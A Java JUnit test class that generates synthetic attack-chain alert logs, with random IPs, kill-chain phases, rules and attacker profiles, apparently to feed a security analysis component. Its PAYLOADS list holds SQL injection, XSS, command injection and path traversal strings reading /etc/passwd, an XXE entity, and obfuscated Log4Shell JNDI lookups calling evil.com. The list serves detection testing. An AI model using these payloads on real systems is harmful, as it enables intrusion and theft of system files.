package org.example.input_security_starter.llm.analysis;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.Test;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.util.*;

/**
 * 攻击链日志生成器测试类
 * 用于生成测试用的攻击链告警日志
 */
public class AttackChainLogGeneratorTest {

    private static final ObjectMapper OBJECT_MAPPER = new ObjectMapper();
    private static final Random RANDOM = new Random();

    private static final String[] ATTACK_IPS = {
        "45.33.32.156", "192.168.1.100", "10.0.0.50", "172.16.0.25",
        "203.0.113.50", "198.51.100.25", "192.0.2.100", "45.55.32.100",
        "104.248.50.100", "159.65.100.50", "167.99.50.100", "178.128.100.50"
    };

    private static final String[] ATTACK_PHASES = {
        "reconnaissance", "delivery", "exploitation", "installation", 
        "command_control", "actions"
    };

    private static final String[][] ATTACK_RULES_BY_PHASE = {
        {"port-scan", "directory-traversal-attempt", "info-disclosure"},
        {"xss-attack", "sql-injection", "ldap-injection", "ssrf-attack"},
        {"path-traversal", "xxe-injection", "template-injection", "deserialization-attack"},
        {"command-injection", "code-execution", "file-upload"},
        {"c2-communication", "data-exfiltration"},
        {"ransomware-activity", "privilege-escalation"}
    };

    private static final String[] URLS = {
        "/api/users", "/api/orders", "/api/products", "/api/search",
        "/admin/login", "/admin/config", "/admin/users", "/admin/settings",
        "/upload/file", "/download/document", "/graphql", "/rest/data",
        "/api/v1/auth", "/api/v2/users", "/api/internal/status"
    };

    private static final String[] PAYLOADS = {
        "' OR 1=1 --", "' UNION SELECT * FROM users --",
        "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "${7*7}", "{{constructor.constructor('return this')()}}",
        "; cat /etc/passwd", "| whoami", "& dir",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "javascript:alert(document.cookie)", "data:text/html,<script>alert(1)</script>",
        "${jndi:ldap://evil.com/a}", "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.com/a}"
    };

    private static final String[] USER_AGENTS = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "curl/7.68.0", "python-requests/2.28.0", "Nmap Scripting Engine",
        "sqlmap/1.5.2", "Nikto/2.1.6", "DirBuster-1.0-RC1"
    };

    private static final String[] ASN_COUNTRIES = {
        "{\"asn\":12345,\"country\":\"CN\",\"isp\":\"China Telecom\"}",
        "{\"asn\":12346,\"country\":\"CN\",\"isp\":\"China Unicom\"}",
        "{\"asn\":12347,\"country\":\"US\",\"isp\":\"Cloudflare\"}",
        "{\"asn\":12348,\"country\":\"HK\",\"isp\":\"PCCW\"}",
        "{\"asn\":12349,\"country\":\"JP\",\"isp\":\"NTT\"}",
        "{\"asn\":12350,\"country\":\"KR\",\"isp\":\"KT\"}"
    };

    private static final String[] THREAT_LEVELS = {"low", "medium", "high", "critical"};
    private static final String[] ATTACK_TYPE_NAMES = {
        "sql-injection", "xss-attack", "command-injection", "ssrf-attack",
        "path-traversal", "xxe-injection", "template-injection", "deserialization-attack"
    };

    @Test
    public void generateHighVolumeAttackLog() throws Exception {
        generateAttackLog("attack-chain-alerts.log", 200);
    }

    @Test
    public void generateComprehensiveAttackLog() throws Exception {
        generateAttackLog("attack-chain-alerts.log", 100);
    }

    @Test
    public void generateMinimalAttackLog() throws Exception {
        generateAttackLog("attack-chain-alerts.log", 20);
    }

    private void generateAttackLog(String filename, int alertCount) throws Exception {
        File logFile = new File(filename);
        System.out.println("Generating " + alertCount + " attack alerts to: " + logFile.getAbsolutePath());

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(logFile))) {
            for (int i = 0; i < alertCount; i++) {
                Map<String, Object> alert = generateSingleAlert(i);
                writer.write(OBJECT_MAPPER.writeValueAsString(alert));
                writer.newLine();
            }
        }

        System.out.println("Generated " + alertCount + " alerts");
        System.out.println("File size: " + logFile.length() + " bytes");
    }

    private Map<String, Object> generateSingleAlert(int index) {
        Map<String, Object> alert = new LinkedHashMap<>();

        String ip = ATTACK_IPS[RANDOM.nextInt(ATTACK_IPS.length)];
        String sessionId = "sess-" + UUID.randomUUID().toString().substring(0, 8);
        long baseTime = System.currentTimeMillis() - RANDOM.nextInt(3600000);

        int phaseCount = RANDOM.nextInt(4) + 1;
        List<String> triggeredPhases = new ArrayList<>();
        for (int i = 0; i < phaseCount; i++) {
            triggeredPhases.add(ATTACK_PHASES[i]);
        }

        List<Map<String, Object>> events = new ArrayList<>();
        int eventCount = RANDOM.nextInt(5) + 1;
        long eventTime = baseTime;

        for (int e = 0; e < eventCount; e++) {
            int phaseIndex = Math.min(triggeredPhases.size() - 1, RANDOM.nextInt(triggeredPhases.size()));
            String phase = triggeredPhases.get(phaseIndex);
            String[] rulesForPhase = ATTACK_RULES_BY_PHASE[phaseIndex];
            String rule = rulesForPhase[RANDOM.nextInt(rulesForPhase.length)];

            Map<String, Object> event = new LinkedHashMap<>();
            event.put("ts", eventTime);
            event.put("phase", phase);
            event.put("rule", rule);
            event.put("url", URLS[RANDOM.nextInt(URLS.length)]);
            event.put("method", RANDOM.nextBoolean() ? "GET" : "POST");
            event.put("ip", ip);
            event.put("payload_preview", PAYLOADS[RANDOM.nextInt(PAYLOADS.length)]);
            event.put("user_agent", USER_AGENTS[RANDOM.nextInt(USER_AGENTS.length)]);
            event.put("status_code", RANDOM.nextBoolean() ? 200 : (400 + RANDOM.nextInt(4) * 100));
            events.add(event);

            eventTime += RANDOM.nextInt(5000) + 100;
        }

        List<Map<String, Object>> attackChains = new ArrayList<>();
        for (int c = 0; c < triggeredPhases.size() - 1; c++) {
            Map<String, Object> chain = new LinkedHashMap<>();
            chain.put("from_phase", triggeredPhases.get(c));
            chain.put("to_phase", triggeredPhases.get(c + 1));
            chain.put("from_rule", ATTACK_RULES_BY_PHASE[c][RANDOM.nextInt(ATTACK_RULES_BY_PHASE[c].length)]);
            chain.put("to_rule", ATTACK_RULES_BY_PHASE[c + 1][RANDOM.nextInt(ATTACK_RULES_BY_PHASE[c + 1].length)]);
            attackChains.add(chain);
        }

        alert.put("alert_type", "attack_chain_detected");
        alert.put("session_id", sessionId);
        alert.put("client_ip", ip);
        alert.put("current_phase", triggeredPhases.get(triggeredPhases.size() - 1));
        alert.put("triggered_phases", triggeredPhases);
        alert.put("event_count", events.size());
        alert.put("duration_ms", eventTime - baseTime);
        alert.put("ts", baseTime);
        alert.put("events", events);
        alert.put("attack_chains", attackChains);

        alert.putAll(generateAttackerProfileContext(ip, triggeredPhases, phaseCount));

        return alert;
    }

    private Map<String, Object> generateAttackerProfileContext(String ip, List<String> triggeredPhases, int phaseCount) {
        Map<String, Object> result = new LinkedHashMap<>();

        int totalAttackCount = RANDOM.nextInt(500) + 50;
        long firstSeenTs = System.currentTimeMillis() - RANDOM.nextInt(604800000);
        long lastSeenTs = System.currentTimeMillis() - RANDOM.nextInt(3600000);

        Map<String, Object> attackerProfile = new LinkedHashMap<>();
        attackerProfile.put("ip", ip);
        attackerProfile.put("asn", 12345 + RANDOM.nextInt(10));
        attackerProfile.put("country", ip.substring(0, 2).hashCode() % 2 == 0 ? "CN" : "US");
        attackerProfile.put("isp", "Example ISP");
        attackerProfile.put("first_seen_ts", firstSeenTs);
        attackerProfile.put("last_seen_ts", lastSeenTs);
        attackerProfile.put("total_attack_count", totalAttackCount);

        Map<String, Integer> attackTypeCounts = new LinkedHashMap<>();
        int mainPhaseIndex = Math.min(triggeredPhases.size() - 1, RANDOM.nextInt(triggeredPhases.size()));
        String mainAttackType = ATTACK_RULES_BY_PHASE[mainPhaseIndex][RANDOM.nextInt(ATTACK_RULES_BY_PHASE[mainPhaseIndex].length)];
        attackTypeCounts.put(mainAttackType, totalAttackCount * 60 / 100);
        attackTypeCounts.put(ATTACK_TYPE_NAMES[RANDOM.nextInt(ATTACK_TYPE_NAMES.length)], totalAttackCount * 25 / 100);
        attackTypeCounts.put(ATTACK_TYPE_NAMES[RANDOM.nextInt(ATTACK_TYPE_NAMES.length)], totalAttackCount * 15 / 100);
        attackerProfile.put("attack_types", attackTypeCounts);

        attackerProfile.put("threat_level", THREAT_LEVELS[RANDOM.nextInt(THREAT_LEVELS.length)]);

        result.put("attacker_profile", attackerProfile);

        List<Map<String, Object>> relatedAttackers = new ArrayList<>();
        int relatedCount = RANDOM.nextInt(3) + 1;
        for (int i = 0; i < relatedCount; i++) {
            Map<String, Object> related = new LinkedHashMap<>();
            String relatedIp = "10.0." + RANDOM.nextInt(256) + "." + RANDOM.nextInt(256);
            related.put("ip", relatedIp);
            related.put("similarity", 0.5 + RANDOM.nextDouble() * 0.5);

            List<String> reasons = new ArrayList<>();
            if (RANDOM.nextBoolean()) reasons.add("same_asn");
            if (RANDOM.nextBoolean()) reasons.add("same_attack_type");
            if (RANDOM.nextBoolean()) reasons.add("time_window_overlap");
            if (reasons.isEmpty()) reasons.add("same_asn");
            related.put("reasons", reasons);

            relatedAttackers.add(related);
        }
        result.put("related_attackers", relatedAttackers);

        return result;
    }
}
